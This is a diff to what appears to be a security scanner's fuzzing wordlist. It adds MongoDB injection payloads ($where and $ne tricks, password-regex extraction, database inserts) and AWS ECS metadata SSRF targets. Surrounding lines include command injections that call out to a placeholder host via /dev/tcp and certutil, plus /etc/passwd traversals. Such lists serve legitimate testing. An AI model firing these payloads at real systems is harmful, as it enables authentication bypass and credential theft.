@@ -313,6 +313,26 @@ NULL
 NOT_NULL
 LE
 GE
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 1==1
+' && this.password.match(\/.*\/)\/\/+%00
+' && this.passwordzz.match(\/.*\/)\/\/+%00
+'%20%26%26%20this.password.match(\/.*\/)\/\/+%00
+'%20%26%26%20this.passwordzz.match(\/.*\/)\/\/+%00
+{$gt: ''}
+[$ne]=1
+';return 'a'=='a' && ''=='
+\";return(true);var xyz='a
+0;return true
 $(\/bin\/bash -c true > \/dev\/tcp\/{domain}\/80)
 $(\/bin\/sh -c true > \/dev\/tcp\/{domain}\/80)
 $(certutil -urlcache -f 'http:\/\/{domain}')
@@ -1039,6 +1059,10 @@ http:\/\/metadata.google.internal\/computeMetadata\/v1
 http:\/\/metadata.google.internal\/computeMetadata\/v1\/
 \/\/metadata.google.internal\/computeMetadata\/v1
 \\\\metadata.google.internal\\computeMetadata\\v1
+http:\/\/169.254.170.2\/v4\/metadata
+http:\/\/169.254.170.2\/v4\/metadata\/
+\/\/169.254.170.2\/v4\/metadata\/
+\\\\169.254.170.2\\v4\\metadata\\
 \/etc\/passwd%00
 ..\/etc\/passwd%00
 ..\/..\/etc\/passwd%00
@@ -1139,6 +1163,10 @@ http:\/\/metadata.google.internal\/computeMetadata\/v1%00
 http:\/\/metadata.google.internal\/computeMetadata\/v1\/%00
 \/\/metadata.google.internal\/computeMetadata\/v1%00
 \\\\metadata.google.internal\\computeMetadata\\v1%00
+http:\/\/169.254.170.2\/v4\/metadata%00
+http:\/\/169.254.170.2\/v4\/metadata\/%00
+\/\/169.254.170.2\/v4\/metadata\/%00
+\\\\169.254.170.2\\v4\\metadata\\%00
 %E2%A0%80%0A%E2%A0%80
 undefined
 undef
@@ -1167,4 +1195,4 @@ hasOwnProperty
 <foo val=\u201Cbar\u201D \/>
 <foo val=\u201Cbar\u201D \/>
 <foo val=\u201Dbar\u201C \/>
-<foo val=`bar' \/
+<foo val=`bar' \/>
